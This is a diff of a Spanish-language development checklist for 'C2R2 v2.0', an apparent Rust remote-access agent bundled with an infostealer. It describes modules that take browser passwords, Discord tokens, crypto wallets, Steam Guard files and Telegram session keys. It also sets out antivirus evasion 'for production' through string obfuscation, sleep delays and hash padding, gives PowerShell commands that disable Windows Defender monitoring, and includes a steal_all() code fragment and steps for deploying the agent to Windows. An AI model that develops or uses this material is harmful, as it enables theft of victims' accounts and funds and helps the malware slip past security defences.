@@ -1,26 +1,26 @@
-# ✅ CHECKLIST DE VERIFICACIÓN - C2R2 v2.0
+#  CHECKLIST DE VERIFICACIÓN - C2R2 v2.0
 
-## �️ DETECCIÓN ANTIVIRUS - ANÁLISIS CRÍTICO
+## � DETECCIÓN ANTIVIRUS - ANÁLISIS CRÍTICO
 
-### ⚠️ Windows Defender: Trojan:Win32/Wacatac.C!ml
+###  Windows Defender: Trojan:Win32/Wacatac.C!ml
 
-**Fecha de detección:** 15/10/2025  
-**Archivo afectado:** `E:\repos\C2R2\target\release\agent.exe`  
+**Fecha de detección:** 15/10/2025
+**Archivo afectado:** `E:\repos\C2R2\target\release\agent.exe`
 **Tipo de detección:** Heurística (comportamiento)
 
 ---
 
-### 🎯 CAUSA RAÍZ IDENTIFICADA
+###  CAUSA RAÍZ IDENTIFICADA
 
 #### **Módulos Recién Agregados (Esta Sesión):**
 
-1. **`telegram.rs`** ⚠️ **CRÍTICO - CAUSA PRINCIPAL**
+1. **`telegram.rs`**  **CRÍTICO - CAUSA PRINCIPAL**
    - Accede a: `%APPDATA%\Telegram Desktop\tdata\key_datas`
    - **Este es el archivo más monitoreado por AV**
    - Permite acceso completo a cuenta de Telegram sin 2FA
    - Windows Defender tiene firma específica para detectar acceso a `key_datas`
 
-2. **`gaming.rs`** ⚠️ Media Prioridad
+2. **`gaming.rs`**  Media Prioridad
    - Accede a: `C:\Program Files (x86)\Steam\config\ssfn*` (Steam Guard)
    - Accede a: Riot Games, Epic Games, Ubisoft, Battle.net
    - Steam Guard tokens son objetivo de gaming stealers
@@ -28,30 +28,30 @@
 #### **Acumulación de Firmas Heurísticas:**
 
 El binario ahora accede a:
-- ✅ Browser credentials (Chrome, Firefox, Edge, Brave)
-- ✅ Discord tokens (LevelDB)
-- ✅ Crypto wallets (Exodus, Metamask, Atomic)
-- ✨ **Gaming credentials** (NEW)
-- ✨ **Telegram sessions** (NEW - CRÍTICO)
+-  Browser credentials (Chrome, Firefox, Edge, Brave)
+-  Discord tokens (LevelDB)
+-  Crypto wallets (Exodus, Metamask, Atomic)
+-  **Gaming credentials** (NEW)
+-  **Telegram sessions** (NEW - CRÍTICO)
 
 **Resultado:** Superó el umbral heurístico de Windows Defender
 
 ---
 
-### 📊 Matriz de Riesgo de Detección
+###  Matriz de Riesgo de Detección
 
 | Módulo | Archivos Accedidos | Riesgo AV | Estado |
 |--------|-------------------|-----------|--------|
-| chromium.rs | Login Data + DPAPI | 🔴 75% | Existente |
-| wallets.rs | Metamask, Exodus | 🔴 80% | Existente |
-| telegram.rs | **key_datas** | 🔴 **95%** | **NEW** |
-| gaming.rs | ssfn*, loginusers.vdf | 🟡 50% | **NEW** |
-| discord.rs | LevelDB tokens | 🟡 40% | Existente |
-| firefox.rs | logins.json | 🟡 30% | Existente |
+| chromium.rs | Login Data + DPAPI |  75% | Existente |
+| wallets.rs | Metamask, Exodus |  80% | Existente |
+| telegram.rs | **key_datas** |  **95%** | **NEW** |
+| gaming.rs | ssfn*, loginusers.vdf |  50% | **NEW** |
+| discord.rs | LevelDB tokens |  40% | Existente |
+| firefox.rs | logins.json |  30% | Existente |
 
 ---
 
-### 🛠️ SOLUCIONES PARA TESTING
+###  SOLUCIONES PARA TESTING
 
 #### Opción 1: Agregar Exclusión de Windows Defender
 
@@ -76,11 +76,11 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableRealtimeMonitoring $false
 ```
 
-⚠️ **Solo para entorno de desarrollo/testing**
+ **Solo para entorno de desarrollo/testing**
 
 ---
 
-### 🔬 TÉCNICAS DE EVASIÓN (Para Producción)
+###  TÉCNICAS DE EVASIÓN (Para Producción)
 
 #### 1. Ofuscación de Strings Críticas
 
@@ -120,7 +120,7 @@ pub fn steal_all() -> StolenData {
     use std::thread;
     use std::time::Duration;
     thread::sleep(Duration::from_secs(90));
-    
+
     let mut data = StolenData::new();
     // ... resto del código
 }
@@ -158,7 +158,7 @@ const PADDING: [u8; 128] = [0x4a; 128]; // Cambia el hash del binario
 
 ---
 
-### 🧪 Test de Detección por Módulo
+###  Test de Detección por Módulo
 
 Para identificar qué módulo específico causa la detección:
 
@@ -173,10 +173,10 @@ pub fn steal_all() -> StolenData {
     // COMENTAR PARA TESTING:
     // let mut wallet_data = wallets::steal_wallets();
     // data.wallets.append(&mut wallet_data);
-    
+
     // let mut gaming_data = gaming::steal_gaming_data();
     // data.gaming.append(&mut gaming_data);
-    
+
     // let mut telegram_data = telegram::steal_telegram_sessions();  // ← PROBABLEMENTE ESTE
     // data.telegram.append(&mut telegram_data);
 
@@ -192,7 +192,7 @@ pub fn steal_all() -> StolenData {
 
 ---
 
-### 📈 Probabilidad de Detección (Estimación)
+###  Probabilidad de Detección (Estimación)
 
 ```
 Sin gaming/telegram:     ████████     40%
@@ -204,61 +204,61 @@ Sin gaming/telegram:     ████████     40%
 
 ---
 
-## �🔍 Revisión de Código
+## � Revisión de Código
 
 ### 1. Builder (`builder/src/`)
 
 #### `main.rs`
-- ✅ CLI eliminado parámetro `shellcode`
-- ✅ Ahora solo requiere `--name` y `--server`
-- ✅ Llama a `generate_agent()` con 2 parámetros
+-  CLI eliminado parámetro `shellcode`
+-  Ahora solo requiere `--name` y `--server`
+-  Llama a `generate_agent()` con 2 parámetros
 
 #### `encrypt.rs`
-- ✅ Eliminadas funciones de encriptación AES
-- ✅ Solo genera `config.rs` con `C2_SERVER`
-- ✅ Compila con `--target x86_64-pc-windows-gnu`
-- ✅ Path correcto: `agent/target/x86_64-pc-windows-gnu/release/agent.exe`
+-  Eliminadas funciones de encriptación AES
+-  Solo genera `config.rs` con `C2_SERVER`
+-  Compila con `--target x86_64-pc-windows-gnu`
+-  Path correcto: `agent/target/x86_64-pc-windows-gnu/release/agent.exe`
 
 #### `Cargo.toml`
-- ✅ Dependencias reducidas a solo `clap`
-- ✅ Eliminadas: `aes`, `cbc`, `rand`, `winapi`, etc.
+-  Dependencias reducidas a solo `clap`
+-  Eliminadas: `aes`, `cbc`, `rand`, `winapi`, etc.
 
 ---
 
 ### 2. Agent (`agent/src/`)
 
 #### `main.rs`
-- ✅ Eliminado código de desencriptación AES
-- ✅ Eliminado código de VirtualAlloc/CreateThread
-- ✅ Conexión directa con `TcpStream::connect()`
-- ✅ Loop de reconexión automática (cada 10s)
-- ✅ Thread separado para envío de sysinfo
-- ✅ Keep-alive: responde a "ping" con "pong"
-- ✅ Ejecución de comandos con `Command::new("cmd")`
-- ✅ Delimitador `\n<<END>>\n` para respuestas
+-  Eliminado código de desencriptación AES
+-  Eliminado código de VirtualAlloc/CreateThread
+-  Conexión directa con `TcpStream::connect()`
+-  Loop de reconexión automática (cada 10s)
+-  Thread separado para envío de sysinfo
+-  Keep-alive: responde a "ping" con "pong"
+-  Ejecución de comandos con `Command::new("cmd")`
+-  Delimitador `\n<<END>>\n` para respuestas
 
 #### `config.rs` (generado)
-- ✅ Solo contiene: `pub const C2_SERVER: &str = "...";`
-- ✅ No hay KEY, IV, ENCRYPTED_SHELLCODE
+-  Solo contiene: `pub const C2_SERVER: &str = "...";`
+-  No hay KEY, IV, ENCRYPTED_SHELLCODE
 
 #### `Cargo.toml`
-- ✅ Sin dependencias (stdlib pura)
-- ✅ Eliminadas: `aes`, `cbc`, `winapi`
-- ✅ Profile release configurado (lto, panic=abort)
+-  Sin dependencias (stdlib pura)
+-  Eliminadas: `aes`, `cbc`, `winapi`
+-  Profile release configurado (lto, panic=abort)
 
 ---
 
 ### 3. Server (`c2r2-server/src/`)
 
 #### Compatibilidad
-- ✅ Ya está preparado para recibir mensajes `__SYSINFO__`
-- ✅ Ya implementa keep-alive ping/pong
-- ✅ Ya maneja delimitador `\n<<END>>\n`
-- ✅ **NO requiere cambios** ✨
+-  Ya está preparado para recibir mensajes `__SYSINFO__`
+-  Ya implementa keep-alive ping/pong
+-  Ya maneja delimitador `\n<<END>>\n`
+-  **NO requiere cambios**
 
 ---
 
-## 🏗️ Compilación Cross-Platform
+##  Compilación Cross-Platform
 
 ### Desde Kali Linux (recomendado):
 
@@ -303,7 +303,7 @@ cargo build --release
 
 ---
 
-## 🧪 Testing Workflow
+##  Testing Workflow
 
 ### 1. En Kali (Atacante):
 
@@ -348,7 +348,7 @@ __SYSINFO__:privileges:User
 
 ---
 
-## 🔐 Configuración para Producción
+##  Configuración para Producción
 
 ### `agent/src/main.rs`
 
@@ -374,7 +374,7 @@ strip = true  # ← Descomentar para eliminar símbolos de debug
 
 ---
 
-## 🎯 Flujo Completo de Trabajo
+##  Flujo Completo de Trabajo
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -416,28 +416,28 @@ strip = true  # ← Descomentar para eliminar símbolos de debug
 
 ---
 
-## 🐛 Problemas Potenciales y Soluciones
+##  Problemas Potenciales y Soluciones
 
 ### Problema 1: "can't find crate for `std`"
-**Causa**: Target no instalado  
+**Causa**: Target no instalado
 **Solución**:
 ```bash
 rustup target add x86_64-pc-windows-gnu
 ```
 
 ### Problema 2: "linker `x86_64-w64-mingw32-gcc` not found"
-**Causa**: mingw-w64 no instalado  
+**Causa**: mingw-w64 no instalado
 **Solución**:
 ```bash
 sudo apt install mingw-w64
 ```
 
 ### Problema 3: "agent.exe no se genera"
-**Causa**: Path incorrecto en encrypt.rs  
+**Causa**: Path incorrecto en encrypt.rs
 **Solución**: Verificar que sea `agent/target/x86_64-pc-windows-gnu/release/agent.exe`
 
 ### Problema 4: "Servidor no recibe conexión"
-**Causa**: Firewall bloqueando puerto 4444  
+**Causa**: Firewall bloqueando puerto 4444
 **Solución**:
 ```bash
 # Linux
@@ -448,12 +448,12 @@ netsh advfirewall firewall add rule name="C2R2" dir=in action=allow protocol=TCP
 ```
 
 ### Problema 5: "Agent se desconecta inmediatamente"
-**Causa**: Server IP incorrecta en config.rs  
+**Causa**: Server IP incorrecta en config.rs
 **Solución**: Verificar IP con `ip a` en Kali
 
 ---
 
-## 📊 Verificación de Archivos Generados
+##  Verificación de Archivos Generados
 
 ### Estructura Esperada:
 ```
@@ -481,7 +481,7 @@ C2R2/
 
 ---
 
-## ✅ Checklist Final
+##  Checklist Final
 
 Antes de probar en producción, verifica:
 
@@ -496,7 +496,7 @@ Antes de probar en producción, verifica:
 
 ---
 
-## 🎓 Diferencias Clave vs Shellcode
+##  Diferencias Clave vs Shellcode
 
 | Aspecto | v1.0 (Shellcode) | v2.0 (Directo) |
 |---------|------------------|----------------|
@@ -511,18 +511,18 @@ Antes de probar en producción, verifica:
 
 ---
 
-## 🚀 Próximos Pasos
+##  Próximos Pasos
 
-1. ✅ Compilar builder en Kali
-2. ✅ Generar agente con IP real
-3. ✅ Iniciar servidor C2
-4. ✅ Transferir agente a Windows
-5. ✅ Ejecutar y verificar conexión
-6. ✅ Probar comandos: `/list`, `/select`, `/cmd`
-7. 🔜 Implementar evasión avanzada (v2.1)
+1.  Compilar builder en Kali
+2.  Generar agente con IP real
+3.  Iniciar servidor C2
+4.  Transferir agente a Windows
+5.  Ejecutar y verificar conexión
+6.  Probar comandos: `/list`, `/select`, `/cmd`
+7.  Implementar evasión avanzada (v2.1)
 
 ---
 
 **Resultado Esperado**: Un agente Windows completamente funcional que se conecta directamente al servidor Tokio sin usar shellcode, msfvenom, o Metasploit.
 
-**Estado**: ✅ LISTO PARA TESTING
+**Estado**:  LISTO PARA TESTING
